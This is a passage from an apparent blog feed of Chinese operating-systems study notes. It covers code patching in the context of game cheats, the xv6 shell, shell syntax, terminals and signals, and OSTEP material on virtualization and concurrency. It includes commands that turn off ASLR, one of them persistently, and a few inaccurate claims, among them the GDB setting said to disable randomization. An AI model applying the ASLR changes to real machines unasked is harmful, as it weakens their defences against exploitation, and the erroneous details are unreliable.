class="keyword">else</span> &#123;</span><br><span class="line">    perror(<span class="string">&quot;DSU fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  foo();</span><br><span class="line">  DSU(foo, foo_new);</span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行这个程序，我们可以看到虽然两次调用的都是 foo()，但在执行过 DSU() 函数打补丁之后，第二次执行 foo() 其实跳转到了 foo_new() 执行。该程序的原理是改写 foo() 函数的第一条指令，在 foo 地址处写一个间接跳转指令跳到 foo_new()。为了实现这点，代码中的细节有：</p>
<ul>
<li>使用 mprotect() 系统调用修改 foo() 函数所在区域的权限。代码段本身是不可写的，我们要为其加上修改权限。这里的”区域“有一点微妙：如果我们要插入的跳转指令正好横跨了两个页面，则我们需要为连续两个页面开放修改权限。within_page() 函数判断了这一点。</li>
<li><code>*(struct jmp *)old = JMP((char *)new - (char *)old);</code> 是打补丁的核心语句。JMP 宏的原理是写上一个间接跳转的操作码，然后计算两个函数地址的 delta。</li>
</ul>
<h3 id="Protection"><a href="#Protection" class="headerlink" title="Protection"></a>Protection</h3><p>防外挂的主要方法是保证控制流和数据流的完整性。事实上，大部分外挂都像是游戏程序的“调试器”：它们不断监听游戏状态并修改游戏数据/代码。我们可以对独立的进程/驱动做完整性检验，还可以拦截向本进程的 ReadProcessMemory 和 WriteProcessMemory 请求，发现后立刻拒绝执行并封号。</p>
<p>其他的一些解决方法包括：从统计学的角度找出不符合规律的操作；让程序在云/沙盒中运行 (即“计算不再信任操作系统”)。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 13: System Calls and UNIX Shell</title>
    <url>/2022/03/30/NJU-OS%20Lecture%2013%20-%20System%20Calls%20and%20UNIX%20Shell/</url>
    <content><![CDATA[<blockquote>
<p>我们是操作系统用户，但操作系统 API 并不是我们作为人类用户直接使用的，那么“我们”到底应该怎么使用操作系统？</p>
</blockquote>
<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>我们需要一个与人类交互的程序，这就是 Shell。之所以叫做 shell，是因为它就像包裹住操作系统内核的一层“壳”：它向内使用系统调用与内核交互，向外与人类用户交互。(Shell 不一定是命令行终端！现在的图形界面也是一种 graphical shell。)</p>
<span id="more"></span>

<p>Shell 本质上是一门 “把用户指令翻译成系统调用的编程语言”。(在 CLI 时代这一点体现得更明显)</p>
<h3 id="Xv6-Shell"><a href="#Xv6-Shell" class="headerlink" title="Xv6 Shell"></a>Xv6 Shell</h3><blockquote>
<p>关于 <code>-ffreestanding</code></p>
<blockquote>
<p> -ffreestanding<br>       Assert that compilation targets a freestanding environment.  This implies -fno-builtin.  A<br>       freestanding environment is one in which the standard library may not exist, and program<br>       startup may not necessarily be at “main”.  The most obvious example is an OS kernel.  This is<br>       equivalent to -fno-hosted.</p>
</blockquote>
<p>以上是 man gcc 中关于 <code>-ffreestanding</code> 选项的说明。加上这个选项后，编译目标是一个类似于“裸机”的 freestanding 的环境。没有标准库，程序的入口不再是 main() 而是 _start()。</p>
</blockquote>
<p><code>sh-xv6.c</code> 是一个零依赖的参考 xv6-riscv 实现的 shell，可以使用 <code>-ffreestanding</code> 选项编译到 <code>.o</code> 文件并直接用 ld 链接。为了实现零依赖，<code>sh-xv6.c</code> 做出了如下的改动：</p>
<ul>
<li><p><code>sh-xv6.c</code> 将 xv6 中的系统调用换成了如下利用 x86-64 syscall 指令的內联汇编代码：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Minimum runtime library</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">syscall</span><span class="params">(<span class="keyword">int</span> num, ...)</span> </span>&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, num);</span><br><span class="line">  <span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a0 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rax&quot;</span>)</span> </span>= num;</span><br><span class="line">  <span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a1 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rdi&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line">  <span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a2 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rsi&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line">  <span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a3 <span class="title">asm</span> <span class="params">(<span class="string">&quot;rdx&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line">  <span class="function"><span class="keyword">register</span> <span class="keyword">long</span> a4 <span class="title">asm</span> <span class="params">(<span class="string">&quot;r10&quot;</span>)</span> </span>= va_arg(ap, <span class="keyword">long</span>);</span><br><span class="line">  va_end(ap);</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;+r&quot;</span>(a0) : <span class="string">&quot;r&quot;</span>(a1), <span class="string">&quot;r&quot;</span>(a2), <span class="string">&quot;r&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(a4)</span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r8&quot;</span>, <span class="string">&quot;r9&quot;</span>, <span class="string">&quot;r11&quot;</span>)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  x86-64 系统调用的各个参数的安放位置可以通过 <code>man 2 syscall</code> 查阅。</p>
</li>
<li><p><code>sh-xv6.c</code> 将 xv6 中所有的 malloc() 替换成了如下的 zalloc()：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> mem[<span class="number">4096</span>], *freem = mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">zalloc</span><span class="params">(<span class="keyword">size_t</span> sz)</span> </span>&#123;</span><br><span class="line">  assert(freem + sz &lt; mem + <span class="keyword">sizeof</span>(mem));</span><br><span class="line">  <span class="keyword">void</span> *ret = freem;</span><br><span class="line">  freem += sz;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  xv6 的写法中 malloc() 没有对应的 free()，这是因为命令总是在 fork 出的子进程上完成的，子进程结束时会自动释放分配的内存。因此 zalloc() 使用了一个 4KB 的数组来模拟堆区，只管分配不管释放，这样 zalloc() 的语义和 malloc() 是相同的 (注：fork() 的时候，父子进程的 mem[] 数组是互不影响的！)。</p>
</li>
</ul>
<p>剩余的部分和 xv6 的 <code>sh.c</code> 基本无异，代价解读见 Xv6 源码解读手册。</p>
<p>近距离观测 <code>sh-xv6.c</code> 的执行过程，我们有以下两种途径：</p>
<ul>
<li><p>GDB。注意 GDB 默认追踪父进程，我们更希望关注子进程的行为，即指令执行的行为。可以通过 <code>set follow-fork-mode</code> <code>set follow-exec-mode</code> 等来修改 GDB 的追踪行为。</p>
</li>
<li><p>strace。为了不将 shell 的输出和 strace 的输出混起来，我们可以这样做：使用命令</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strace -f -o /tmp/strace.log  ./sh</span><br></pre></td></tr></table></figure>

<p>  将 strace 的输出打印到文件 <code>/tmp/strace.log</code> 中，<code>-f</code> 选项可以追踪所有子进程的系统调用。然后另开一个窗口执行</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -f /tmp/strace.log</span><br></pre></td></tr></table></figure>

<p>  其中 <code>-f</code> 选项会 “output appended data as the file grows” (from <code>man tail</code>)。配合 Tmux，我们将获得良好的 strace 观测体验。</p>
</li>
</ul>
<h3 id="The-Shell-Programming-Language"><a href="#The-Shell-Programming-Language" class="headerlink" title="The Shell Programming Language"></a>The Shell Programming Language</h3><p>使用 shell 本质上就是在编程。我们组合各种指令来完成复杂的任务。shell 提供基于文本替换的快速工作流的搭建：</p>
<ul>
<li>重定向：<code>cmd &gt; /dev/null</code></li>
<li>顺序结构：<code>cmd1 ; cmd2</code> (两者都执行)，<code>cmd1 &amp;&amp; cmd2</code> (前者返回值为 0 才继续执行后者)，<code>cmd1 || cmd2</code> (前者返回值为 1 才继续执行后者) etc.</li>
<li>管道：<code>cmd1 | cmd2</code></li>
<li>预处理：<code>$()</code>  (将一个命令的输出作为另一个命令的参数)，<code>&lt;()</code> (将一个命令的输出重定向到一个文件，返回文件描述符作为另一个命令的参数) etc.</li>
<li>环境变量</li>
</ul>
<p>现代 GUI 能完成的事情绝大多数 CLI 也能完成，比如在图形界面中，我们通过点”叉” “最小化” 来管理前后台任务，窗口。在 CLI 中我们也有 job control。在执行命令时，我们可以在后面加上 <code>&amp;</code> 使其在后台执行；对于一个正在前台运行的程序，我们可以通过 <code>ctrl+z</code> 将其暂时挂起，用 <code>bg %num</code> 将指定进程放到后台执行；对于在后台运行的程序，我们可以用 <code>fg %num</code> 将其拉到前台执行。</p>
<hr>
<p>UNIX shell 在自然语言、机器语言和1970s算力之间达到了一个优雅的平衡。但平衡意味着 UNIX shell 的设计也不是完美的。例如操作的优先级：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls &gt; a.txt | cat</span><br></pre></td></tr></table></figure>

<p>重定向和管道的优先级谁高？使用不同的 shell会得到不同的结果。(bash 不会打印到终端，zsh 会打印到终端 etc.)</p>
<p>再例如文件名中的空格会带来很大的危险：如果使用命令 <code>vim &quot;a b.txt&quot;</code>，事实上我们连续打开了 <code>a</code> 和 <code>b.txt</code>，这与我们的预期不同。这本质上是因为空格具有二义性：它有可能是分隔指令的符号。(Windows 的 powershell 有 object stream pipe，在管道中传递的东西不再是文本而是对象，这使得所有的东西都是 strongly typed 的，可以避免上述问题。)</p>
<p>再比如，有些行为的意义可能是难以理解的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; /etc/a.txt</span><br></pre></td></tr></table></figure>

<p>无法执行，shell 会返回 permission denied。这时我们本能地在前面加上 sudo：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> hello &gt; /etc/a.txt</span><br></pre></td></tr></table></figure>

<p>却发现仍然是 permission denied。联想 xv6-shell 中解析命令的机制，我们就不难理解这个问题的原因。shell 完成重定向输出的方法是：关闭 stdout 文件，打开 <code>/etc/a.txt</code> 文件 (其文件描述符绑定为 1)，然后执行左边的指令。也就是说，sudo 只修饰了左边的执行，打开文件的过程没有获得高权限，所以报错。</p>
<h2 id="TTY-and-Job-Control"><a href="#TTY-and-Job-Control" class="headerlink" title="TTY and Job Control"></a>TTY and Job Control</h2><p>我们还有一些疑问：例如没有任何程序在读键盘输入的情况下为什么 Ctrl+C 可以退出程序？为什么在有些应用 (e.g. vim) 中 Ctrl+C 不能退出？如果当前程序 fork 出了多个进程，Ctrl+C 会退出所有程序吗？Tmux 为什么能管理多个窗口？</p>
<p>答案是终端。终端是 UNIX 操作系统中的一类非常特别的设备。命令行中有工具 tty 可以查看连接到标准输入的终端文件名。如果我们在 Tmux 的不同窗口中使用 tty 命令，可以看到不同的窗口连接到了不同的终端设备。我们甚至可以做一些有趣的事情：在一个窗口中 <code>echo hello &gt; /dev/pts/other</code>，hello 将显示在另一个窗口中。</p>
<blockquote>
<p>为什么 <code>fork-printf.c</code> 可以根据标准输出对象的不同选择不同的 buffer mode？</p>
</blockquote>
<p>通过 strace 观察，可以看到程序使用了 fstat() 系统调用查看 1 号文件 (标准输出) 的信息。在有重定向的版本的系统调用序列中，ioctl() 系统调用返回了 ENOTTY。</p>
<h3 id="Session-Process-Group-and-Signal"><a href="#Session-Process-Group-and-Signal" class="headerlink" title="Session, Process Group and Signal"></a>Session, Process Group and Signal</h3><blockquote>
<p>Ctrl+C 为什么能退出？</p>
</blockquote>
<p>简单来说，我们的终端负责识别 Ctrl+C 的按键组合，并给<strong>前台</strong>进程发送一个 SIGINT 信号。前台程序有自由决定如何处理这个 SIGINT 信号，绝大部分的程序会在接收到 SIGINT 信号后退出，但我们也可以自己写一个 signal handler：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// signal-handler.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> signum)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (signum) &#123;</span><br><span class="line">    <span class="keyword">case</span> SIGINT:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Received SIGINT!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SIGQUIT:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Received SIGQUIT!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;atexit() cleanup\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  signal(SIGINT,  handler);</span><br><span class="line">  signal(SIGQUIT, handler);</span><br><span class="line">  atexit(cleanup);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">int</span> nread = read(STDIN_FILENO, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    buf[nread - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%d] Got: %s\n&quot;</span>, getpid(), buf);</span><br><span class="line">    <span class="keyword">if</span> (nread &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 上面的程序为 SIGINT 和 SIGQUIT 两个信号注册了处理函数。运行该程序，我们发现按下 Ctrl+C 时程序不会退出，而是输出 <code>Received SIGINT!</code>。</p>
<p>这时有一个更有意思的问题：如果我们在 main() 函数开头执行一个 fork()，那么父子进程的标准输入和输出会连向同一个 tty，这时按下 Ctrl+C 终端会将 SIGINT 发送给哪个进程呢？经过实验我们发现：fork() 以后的 <code>signal-handler.c</code> 在输入字符时，两个进程会争抢输入数据，呈现各打印了一部分内容的现象；如果按下 Ctrl+C，会出现两个 <code>Received SIGINT!</code>。这说明 SIGINT 信号同时发送给了这两个进程。</p>
<p>阅读 setpgid() 的手册，我们可以看到更系统的解读：</p>
<p>当我们打开一个 shell 时，我们就创建了一个会话 (session)，这个会话有一个 controlling terminal。一个会话里面可以有若干个进程组 (process group) (注：shell 本身也是一个进程组，通常称为 session leader)，一个进程 fork() 得到的子进程和父进程同属一个进程组，execve() 不会改变一个进程所属的进程组。在任何时刻，一个会话里有且仅有一个前台 (foreground) 进程组，剩余的进程组都是后台进程组。当终端给会话发送一个信号时，前台进程组里的每个进程都会接收到这个信号。只有前台进程组中的进程可以从终端读取数据，如果后台进程尝试从终端读取数据，会接收到一个 SIGTTIN 信号，该信号会将后台进程挂起。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 02: Introduction to Operating Systems</title>
    <url>/2022/03/22/OSTEP/OSTEP%20Chapter%2002%20-%20Introduction%20to%20Operating%20Systems/</url>
    <content><![CDATA[<p>操作系统：为上层多个应用程序的正常运行提供支持。操作系统实现这一目的的重要方法是虚拟化：将硬件资源抽象成简单易用的虚拟资源。为了方便上层应用程序使用这些资源，操作系统会提供数百个系统调用。从这个角度来看，操作系统也很像一个标准库。</p>
<span id="more"></span>

<h2 id="2-1-Virtualizing-The-CPU"><a href="#2-1-Virtualizing-The-CPU" class="headerlink" title="2.1 Virtualizing The CPU"></a>2.1 Virtualizing The CPU</h2><p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2002%20-%20intro/cpu.c">cpu.c</a> 的作用是每过一秒钟输出一次字符串。<code>Spin(1)</code> 表示等待一秒，其实现在 <a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2002%20-%20intro/common.h">common.h</a> 中，其中 GetTime() 是对系统调用 gettimeofday() 的进一步封装，返回系统启动以来的秒数。Spin() 会不断调用 GetTime()，直到间隔时间达到输入值 howlong。</p>
<p>键入命令 <code>./cpu A &amp; ; ./cpu B &amp; ; ./cpu C &amp; ; ./cpu D &amp;</code>，可以看到A,B,C,D 交替输出，仿佛各自独占了 CPU。操作系统通过虚拟化 CPU 的方式，给上层应用程序一种系统中有很多很多个 CPU 的假象。至于多个进程谁在真正的物理 CPU 上运行，这取决于操作系统的调度策略。</p>
<blockquote>
<p><strong>为什么程序会不停输出，按 <code>Ctrl+C</code> 也无法停止？</strong></p>
<p>上文中，用分号隔开各个命令表示这些命令都要执行。它和 <code>&amp;&amp;</code> 的区别在于：<code>&amp;&amp;</code> 要求第一个命令执行成功才会执行第二个命令，而 <code>;</code> 不论第一个命令是否成功都会执行第二个命令 (可以用 <code>gcc notexist.c ; ls</code> 和 <code>gcc notexist.c &amp;&amp; ls</code> 做实验验证)。</p>
<p>在命令最后加上 <code>&amp;</code> 表示将这个进程放到后台执行， <code>Ctrl+C</code> 的意义是中断所有正在运行的前台进程，因此该组合键无法终止后台运行的进程。如果某个命令所需要的执行时间很长，可以用 <code>&amp;</code> 将其放在后台执行，从而终端界面仍然可以继续操作。在使用 <code>&amp;</code> 时，bash 会提示分配给该任务的进程号。如果想要结束后台任务，可以使用命令 <code>kill pid</code> 。</p>
<p>这里我们使用 <code>&amp;</code> 的原因在于：用 <code>;</code> 分隔的若干命令总是会依次执行，即第一个执行结束才会执行第二个。而  cpu 程序中有一个死循环，为了观测“并发”，我们必须让四个任务同时运行起来。</p>
</blockquote>
<h2 id="2-2-Virtualizing-Memory"><a href="#2-2-Virtualizing-Memory" class="headerlink" title="2.2 Virtualizing Memory"></a>2.2 Virtualizing Memory</h2><p>物理内存本身没有任何特殊之处，就是一个大数组，每个位置有一个物理地址。</p>
<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2002%20-%20intro/mem.c">mem.c</a> 会调用 malloc() 分配一个地址，并不断向该地址写入内容。如果我们使用 <code>./mem 1 &amp; ; ./mem 1 &amp;</code>  命令，我们会发现两个进程分配的地址是一样的，然而两个进程都在完好地运行。这是因为每个进程都有自己的虚拟地址空间，输出的地址是进程的虚拟地址，不同进程的相同虚拟地址会指向不同的物理地址。操作系统负责虚拟化内存，保证每个进程只能访问自己的地址空间。</p>
<blockquote>
<p><strong>为什么我使用上述命令无法复现，两个地址不一样？</strong></p>
<p>Linux 默认使用了地址空间随机化 (Address Space Layout Randomization, ASLR) 技术。ASLR 是一种针对缓冲区溢出攻击的安全保护技术，通过对堆、栈、共享库映射等布局的随机化增加攻击者预测目的地址的难度，关于利用固定地址进行攻击的方法可以见<a href="https://kristoff-starling.github.io/2022/02/28/Stack-smashing%20Attack%20-%20An%20Introduction/">这篇文章</a>。在 <code>/proc/sys/kernel/randomize_va_space</code> 文件中，我们可以查看当前 ASLR 是否打开：0 表示关闭，1 表示对于部分函数打开，2 表示完全打开。</p>
<p>为了暂时关闭 ASLR 以复现上述情境，我们可以使用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setarch `uname -m` -R /bin/zsh</span><br></pre></td></tr></table></figure>

<p>其中 <code>uname -m</code> 命令会输出机器架构，该参数可以省略；<code>-R</code> 参数 (对应长参数 <code>--addr-no-randomize</code>) 表示关闭 ASLR。执行该命令会暂时打开一个新的 shell (默认 <code>/bin/sh</code>，可以通过最后一个参数指定其他 shell)，该 shell 和其子进程会在关闭 ASLR 的情况下执行命令 (退出该 shell 后，一切恢复)。</p>
<p>另外一种方法是使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
<p>机器重启后该改变会消失。如果想要永久性的关闭 ASLR，可以将 <code>kernel.randomize_va_space=0</code> 写到 <code>/etc/sysctl.conf</code> 中。</p>
<p>如果使用 GDB 调试，可以通过命令 <code>set disable-randomization off</code> 关闭 ASLR。</p>
</blockquote>
<h2 id="2-3-Concurrency"><a href="#2-3-Concurrency" class="headerlink" title="2.3 Concurrency"></a>2.3 Concurrency</h2><p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2002%20-%20intro/threads.c">threads.c</a> 创建了两个线程，创建线程调用的函数是 Pthread_create()，它在 <code>common_threads.h</code> 中定义，是对 POSIX 线程库的简单封装：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Pthread_create(thread, attr, start_routine, arg) assert(pthread_create(thread, attr, start_routine, arg) == 0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Pthread_join(thread, value_ptr)                  assert(pthread_join(thread, value_ptr) == 0);</span></span><br></pre></td></tr></table></figure>

<p>让两个线程各执行 N 次 +1 操作，可以观测到结果不是 2N。这主要是因为核心语句 <code>counter++</code> 会被编译成三条汇编语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov &amp;counter, register</span><br><span class="line">add $1, register</span><br><span class="line">mov register, &amp;counter</span><br></pre></td></tr></table></figure>

<p>由于原子性的丧失，可能出现 race condition。</p>
<h2 id="2-4-Persistence"><a href="#2-4-Persistence" class="headerlink" title="2.4 Persistence"></a>2.4 Persistence</h2><p>数据的持久性是一个重要的话题。内存中存储的数据是不稳定的——机器一旦断点，DRAM 中的信息就会丢失。我们需要硬盘来存储长期数据，硬盘在现代系统中被看作 I/O 设备的一部分，管理硬盘信息的软件称为文件系统。</p>
<p>操作系统对于硬盘的抽象和 CPU，内存不同。我们针对 CPU 抽象出了进程，对于内存抽象出了虚拟地址空间，其目的都是为了让某一个程序“独占”整个计算机资源。而硬盘上的数据理应让各个程序共享，比如编辑器创建了一个文件，然后编译器负责编译它，接着加载器负责加载、运行这个程序。操作系统通过系统调用来抽象硬盘：将复杂的硬件读写操作封装成简单的接口。</p>
<p>在 <a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2002%20-%20intro/io.c">io.c</a> 中我们使用了 open() 和 write() 系统调用来创建，写入文件。这些系统调用底层的实现非常复杂 (比如为了性能的提升，读写都有缓冲区)，但上层使用这些 API 非常简便。OS 在这里充当了标准库的角色。</p>
<h2 id="2-5-Design-Goals"><a href="#2-5-Design-Goals" class="headerlink" title="2.5 Design Goals"></a>2.5 Design Goals</h2><p>操作系统应当努力追求的目标：</p>
<ul>
<li>高性能；</li>
<li>保护/隔离：应用程序之间不能互相“伤害“；</li>
<li>可靠：操作系统一旦崩溃，在其上运行的所有应用程序都无法使用，因此操作系统必须是非常可靠的软件。</li>
<li>……</li>
</ul>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 26: Concurrency: An Introduction</title>
    <url>/2022/02/26/OSTEP/OSTEP%20Chapter%2026%20-%20Concurrency%20An%20Introduction/</url>
    <content><![CDATA[<p>一个多线程程序会有多个执行流，即有好几个 PC 并发/并行地取指执行，我们可以将其理解为多个进程，不过它们共享同一个地址空间。每个线程有自己的 PC 和一套寄存器，因此类似于进程切换，我们也需要线程切换。不过由于线程共享地址空间，所以线程切换时无需切换页表。</p>
<p>虽然线程可以共享地址空间，但每个线程要有自己独立的栈。不同于单线程地址空间，多线程程序的地址空间中有多个栈，每个线程一个，这个线程栈也被称为 thread-local storage。</p>
<span id="more"></span>

<h2 id="26-1-Why-Use-Threads"><a href="#26-1-Why-Use-Threads" class="headerlink" title="26.1 Why Use Threads?"></a>26.1 Why Use Threads?</h2><p>使用线程至少有以下两点好处：</p>
<ul>
<li>提高并行度。在一个多核处理器上，我们可以让多个线程每个占据一个 CPU 核，分摊一部分工作，从而达到并行提速的效果。</li>
<li>避免 I/O 操作阻塞程序。如果一个线程在等待 I/O 操作，CPU 可以通过线程切换让别的线程上 CPU 工作，这样就实现了等 I/O 和做其他事情同时进行。</li>
</ul>
<h2 id="26-2-An-Example-Thread-Creation"><a href="#26-2-An-Example-Thread-Creation" class="headerlink" title="26.2 An Example: Thread Creation"></a>26.2 An Example: Thread Creation</h2><p><a href="">t0.c</a> 中创建了两个进程并让它们打印不同的内容。在多线程程序中，各个线程执行的顺序是不确定的：先被创建的进程可能会后执行；一个线程被创建了之后可能在 wait 它时才执行，也可能会立即执行，然后 wait 时立即返回 etc.</p>
<h2 id="26-3-Why-It-Gets-Worse-Shared-Data"><a href="#26-3-Why-It-Gets-Worse-Shared-Data" class="headerlink" title="26.3 Why It Gets Worse: Shared Data"></a>26.3 Why It Gets Worse: Shared Data</h2><p><a href="">t1.c</a> 中创建了两个线程，两个线程都对共享变量进行 N 次 +1，在 N 较大时可以观测到共享变量的结果小于 2N。</p>
<blockquote>
<p><strong>Thread-local Variables</strong></p>
<p>在线程调用的函数里定义的变量都会是 thread local 的变量。<code>t1.c</code> 中打印了局部变量 i 的地址，可以看到不同的线程打印出的地址不一样 (在各自的线程栈上)。</p>
<p>在函数体外，用 <code>__thread</code> 修饰的变量也是 thread local 的。</p>
</blockquote>
<blockquote>
<p><strong>Valgrind</strong></p>
<p>Valgrind 中的 memchecker 是强大的内存检测工具。编译好一个文件 <code>proc.c</code> 后用 <code>valgrind ./proc</code> 执行，可以检测 memory leak, use after free 等问题。</p>
</blockquote>
<h2 id="26-4-The-Heart-Of-The-Problem-Uncontrolled-Scheduling"><a href="#26-4-The-Heart-Of-The-Problem-Uncontrolled-Scheduling" class="headerlink" title="26.4 The Heart Of The Problem: Uncontrolled Scheduling"></a>26.4 The Heart Of The Problem: Uncontrolled Scheduling</h2><p><code>counter ++</code> 这条语句在汇编层面是三条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov (addr), %eax</span><br><span class="line">add $0x1, %eax</span><br><span class="line">mov %eax, (addr)</span><br></pre></td></tr></table></figure>

<p>其中 <code>addr</code> 是 counter 变量的内存地址。如果两个线程轮流执行汇编语句，那么它们各执行一次 +1 后，事实上 counter 只加了 1,并没有 +2。</p>
<p>我们称这两个线程触发了竞争条件 (race condition)，准确说是一次数据竞争。导致这一竞争的代码称为临界区域 (critical section)。我们希望实现一种互斥机制，使得一个线程执行临界区域代码时不会被另一个线程打断。</p>
<h2 id="26-5-The-Wish-For-Atomicity"><a href="#26-5-The-Wish-For-Atomicity" class="headerlink" title="26.5 The Wish For Atomicity"></a>26.5 The Wish For Atomicity</h2><p>我们希望有这样的一条原子指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">momory-add (addr), 0x1</span><br></pre></td></tr></table></figure>

<p>可以一下子帮我们完成 +1 操作。这里的原子性指的是：操作在执行过程中不会被中途打断。这个操作是一个最小的单元，它要么被完全执行了，要么没有被执行  (all or none)，不会在某时刻处于执行了一半的状态。</p>
<p>将若干个操作打包成一个原子指令的过程我们称为一个交易 (transaction)。但硬件不能允许我们无限制地添加原子指令。我们要实现的是一种同步机制，它可以保证多个线程以一种可控的方式进入临界区域，从而使得执行正确。</p>
<h2 id="26-6-One-More-Problem-Waiting-For-Another"><a href="#26-6-One-More-Problem-Waiting-For-Another" class="headerlink" title="26.6 One More Problem: Waiting For Another"></a>26.6 One More Problem: Waiting For Another</h2><p>在某些情境下，一个线程需要等待某件事情做好了才能继续进行，比如等待 I/O 操作完成。操作系统不仅要支持线程之间的同步，还要支持在某些条件下挂起/唤醒线程，这会通过条件变量 (condition variables) 来实现。</p>
<h2 id="26-7-Summary-Why-in-OS-Class"><a href="#26-7-Summary-Why-in-OS-Class" class="headerlink" title="26.7 Summary: Why in OS Class?"></a>26.7 Summary: Why in OS Class?</h2><p>操作系统本身也是一个并发程序。如果有多个程序使用 write() 系统调用，那么操作系统就必须非常小心地处理内核中和 write() 有关的并发数据结构。</p>
]]></content>
      <categories>
